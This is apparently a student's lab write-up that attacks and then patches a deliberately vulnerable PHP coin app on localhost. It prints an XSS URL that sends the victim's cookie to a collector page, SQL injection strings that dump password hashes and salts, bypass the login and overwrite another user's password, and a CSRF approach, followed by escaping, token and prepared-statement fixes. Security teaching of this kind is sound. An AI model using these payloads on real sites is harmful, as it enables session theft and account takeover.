Part 1: Black Box Assessment
----------------------------

## Attack A. Cookie Theft

The URL for the cookie theft is:

	http://localhost/barbarbar/users.php?user=" size=10>
		<script>
			var i = document.createElement('img');
			i.src = 'http://localhost:8080/barbarbar/cookies.php?cookie=' %2B document.cookie;
		</script>
		<input type="hidden"

Here the URL has spans multiple lines for better readability, but when 
it is run, it should only span a single line (hence we delete every 
newline).

The URL first ends the the search field and then starts a script tag
in which a img tag with the cookie stealing url as src. The img tag
is used as it allows for a GET request done in the background while
the rest of the page loads.

The site looks normal as the input field still gets the size attribute 
and we use a hidden input to close the original ending of the user
input field.

The coin text and the red warning text does not appear when the URL
uses single quotes, but does when double quotes a used. Exactly why this
is, is unclear to me, but it seems to be that some part of the backend
is escaped.


## Attack B. Cross-Site Request Forgery

The HTML file to perform the CSRF can be found in 'attackB.html'. The
document posts a form with the same inputs as 'transfer.php'.

To avoid the address bar having localhost the form is posted to an 
iframe. Both the form and the iframe are hidden, so the user only sees
a blank site.

As a post request does not return anything the page is redirected
after a delay of 100ms. This is not an ideal solution, as the request
might not be done, and thus the attack will fail. However 100ms is so 
small that a user will not notice, and in most cases it will be enough
for the attack to successfully post the transfer.


Part 2: White Box Assessment
----------------------------

## List of users

We can get a list of all users, theirs number of coins, hashed passwords
and salts by inserting the following in the user search field on
'user.php':

	'
	UNION ALL
	SELECT
		GROUP_CONCAT(Username, ', ', DikuCoins, ', ', Password, ', ', Salt SEPARATOR '<br>') AS Profile,
		NULL as Username,
		NULL as DikuCoins
	FROM Person
	WHERE '1'='1
	
When combined with the statement for selecting the user we get the
statement:

	SELECT Profile, Username, DikuCoins FROM Person
    WHERE Username=''
	UNION ALL
	SELECT
		GROUP_CONCAT(Username, ', ', DikuCoins, ', ', Password, ', ', Salt SEPARATOR '<br>') AS Profile,
		NULL as Username,
		NULL as DikuCoins
	FROM Person
	WHERE '1'='1'
	
This returns all users, their number of coins, their password and salt as
one big string (where each user is separated using a '<br>' to give new
lines in the html)

The list will emerge in the profile text part of the 'users.php' as we
set the Profile value as the concatenated string.

Notice that we cannot get the users actual passwords as these are hashed
but we are able to get their hashed passwords and salts.


## Change password of br0ns

We can log in as any user if we know their username. This can be done by
using the following login credentials on 'login.php':

	username: [username]' OR '1'='1
	password: [any non-empty string]

Where [username] is the user we want to log in as. This works because
the function _checkLogin in 'auth.php' simply uses the _POST variables.
The function returns true if the statement:

	$sql = "SELECT * FROM Person WHERE " .
			"Username = '$username' AND " .
			"Password = '$hashedpassword'";

returns a user. If we thus use the given credentials (with e.g. br0ns)
we get the statement:

	$sql = "SELECT * FROM Person WHERE " .
			"Username = 'br0ns' OR '1'='1' AND " .
			"Password = '$hashedpassword'";
    
As AND binds stronger than OR the first part finds the user br0ns and 
omits the password check.

When first we a logged in a user we can go to their profile page on
'index.php' and use the description field to update the password of the 
user.

Firstly we decide on a password and hash it using e.g. md5sum on the 
terminal:

	echo -n "[password][salt]" | md5sum

If e.g. we want to change the password to 'mypass' with the salt 'fooz' 
we write

	echo -n "mypassfooz" | md5sum

which returns the hashed password 41a246c4f686338d9d6836bb4a521adb. We 
then save the following description:

	[description]', Password='[hashedpassword]', Salt='[salt]

Which in this case would be:

	Bad Cop', Password='41a246c4f686338d9d6836bb4a521adb', Salt='fooz
	
This works because 'index.php' simply uses the _POST variable directly 
in a SQL statement that updates the table Persons as following:

	$sql = "UPDATE Person SET Profile='$profile' ".
			   "WHERE PersonID=$user->id";

Here $profile is the _POST variable, thus if we write the description as
above we get:

$sql = "UPDATE Person SET Profile='Bad Cop', Password='41a246c4f686338d9d6836bb4a521adb', Salt='fooz' ".
           "WHERE PersonID=$user->id";
           
which will then update the password and salt. Notice that the reason we
have to be logged in is, that the statement uses a WHERE which we cannot
omit.


Part 3: Fix It
--------------

The changed source files can be found in the zip file src.zip

## Fixing attack A

We can prevent the first attack by escaping html special characters when
we use $_GET['user']. Thus we change line 12 and 18 in 'users.php' to:

	line 12: echo htmlspecialchars(stripslashes($_GET['user'])); 
	line 18: $selecteduser = htmlspecialchars($_GET['user']); 

This escapes the special characters which allowed us to end the html tag
thus preventing the attack.


## Fixing attack B

We can prevent the second attack by adding an extra hidden input 
containing the token the user gets when logging in. Thus we at
the top of the 'transfer.php' add the following:

	// Get the cookie
	$sql = "SELECT Token FROM Person WHERE PersonId = $user->id";
	$rs = $db->query($sql);
	$token = $rs->fetch_row()[0];

And we change the if-statement to:

	if($_POST['submission'] && $_POST['token'] == $token)

Finally we add the input field in the form:

	<input type=hidden name=token value="<?php echo $token ?>">
	
Thus the if-statement will only run if the token matches the users
users current token. This cannot be forged with the HTML document.

And since it changes on every login an adversary cannot simply steal
it once, but would have to steal the one for the current login and 
have the user open a HTML with that specific token added.


## Fixing a SQL Injection

I have decided to correct the SQL injections which can be performed in
the search field on 'user.php' as we utilised in the white box
assessment. To correct this we can use a prepared statement instead of
simply change the top part in 'user.php' just before and after the 
if-statement to:

	$query = mysqli_prepare($db, "SELECT Profile, Username, DikuCoins FROM Person WHERE Username = ?");
	mysqli_stmt_bind_param($query, 's', $selecteduser);
	mysqli_stmt_execute($query);
	mysqli_stmt_bind_result($query, $profile, $username, $coins);
	mysqli_stmt_fetch($query);
	if ( $username != '' ) { // Sanitize and display profile
		$coins = intval($coins);

This prevents the SQL injections where we can escape and select the
entire list of users.
